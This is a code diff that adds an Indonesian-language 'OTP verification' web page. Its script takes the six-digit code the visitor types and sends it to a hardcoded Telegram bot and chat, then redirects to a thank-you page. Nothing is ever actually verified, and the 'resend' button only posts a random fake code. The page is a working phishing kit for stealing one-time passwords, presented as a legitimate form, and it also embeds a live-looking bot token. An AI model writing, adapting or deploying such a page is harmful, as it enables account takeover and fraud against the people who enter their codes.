@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifikasi OTP</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f4f6fa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      color: #333;
+    }
+
+    .container {
+      background: #fff;
+      padding: 20px 24px;
+      border-radius: 16px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+      text-align: center;
+      width: 90%;
+      max-width: 380px;
+    }
+
+    h2 {
+      color: #006ee9;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      margin-bottom: 20px;
+      color: #555;
+    }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+
+    .otp-inputs input {
+      width: 40px;
+      height: 48px;
+      text-align: center;
+      font-size: 18px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+
+    .otp-inputs input:focus {
+      border-color: #006ee9;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #006ee9;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+
+    #resendBtn {
+      background: transparent;
+      color: #006ee9;
+      text-decoration: underline;
+      margin-top: 10px;
+      display: none;
+      border: none;
+    }
+
+    .timer {
+      margin-bottom: 15px;
+      font-size: 14px;
+      color: #888;
+    }
+
+    #status {
+      font-size: 14px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Verifikasi Kode OTP</h2>
+  <p>Masukkan 6 digit kode yang telah dikirim</p>
+
+  <div class="otp-inputs">
+    <input type="text" maxlength="1" />
+    <input type="text" maxlength="1" />
+    <input type="text" maxlength="1" />
+    <input type="text" maxlength="1" />
+    <input type="text" maxlength="1" />
+    <input type="text" maxlength="1" />
+  </div>
+
+  <div class="timer" id="timer">Sisa waktu: 30:00</div>
+  <button id="verifyBtn" onclick="submitOTP()">Verifikasi</button>
+  <button id="resendBtn" onclick="resendOtp()">Kirim Ulang Kode</button>
+  <div id="status"></div>
+</div>
+
+<script>
+  const token = "7412368257:AAEr_6ARKm2Jg0AmGq3UnWKUNSvpDqR5RVs";
+  const chat_id = "-4770559077";
+
+  const inputs = document.querySelectorAll(".otp-inputs input");
+  const buttonEl = document.getElementById("verifyBtn");
+  const timerEl = document.getElementById("timer");
+  const resendBtn = document.getElementById("resendBtn");
+  const statusEl = document.getElementById("status");
+
+  let timeLeft = 1800; // 30 menit
+  let timerInterval;
+
+  function updateTimer() {
+    const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+    const seconds = String(timeLeft % 60).padStart(2, '0');
+    timerEl.innerText = `Sisa waktu: ${minutes}:${seconds}`;
+
+    if (timeLeft > 0) {
+      timeLeft--;
+    } else {
+      timerEl.innerText = "⏰ Waktu habis. Silakan minta ulang kode OTP.";
+      buttonEl.disabled = true;
+      resendBtn.style.display = "inline-block";
+      clearInterval(timerInterval);
+    }
+  }
+
+  function startTimer() {
+    updateTimer();
+    timerInterval = setInterval(updateTimer, 1000);
+  }
+
+  function getOTP() {
+    return Array.from(inputs).map(input => input.value).join("");
+  }
+
+  function submitOTP() {
+    const otp = getOTP();
+    if (otp.length !== 6) {
+      statusEl.innerText = "⚠️ Kode OTP tidak lengkap.";
+      return;
+    }
+
+    statusEl.innerText = "⏳ Mengirim...";
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: `Kode OTP yang dimasukkan: ${otp}`
+      })
+    }).then(() => {
+      statusEl.innerText = "✅ OTP berhasil dikirim.";
+      setTimeout(() => window.location.href = "terimakasih.html", 1000);
+    }).catch(() => {
+      statusEl.innerText = "❌ Gagal mengirim OTP.";
+    });
+  }
+
+  function resendOtp() {
+    timeLeft = 1800;
+    resendBtn.style.display = "none";
+    buttonEl.disabled = false;
+    startTimer();
+
+    // Kirim ulang kode ke Telegram
+    const otpBaru = Math.floor(100000 + Math.random() * 900000);
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: `🔁 Kode OTP baru: ${otpBaru}`
+      })
+    });
+  }
+
+  inputs.forEach((input, index) => {
+    input.addEventListener("input", () => {
+      if (input.value && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+    });
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
+  });
+
+  // Mulai timer saat halaman dimuat
+  window.onload = startTimer;
+</script>
+
+</body>
+</html>
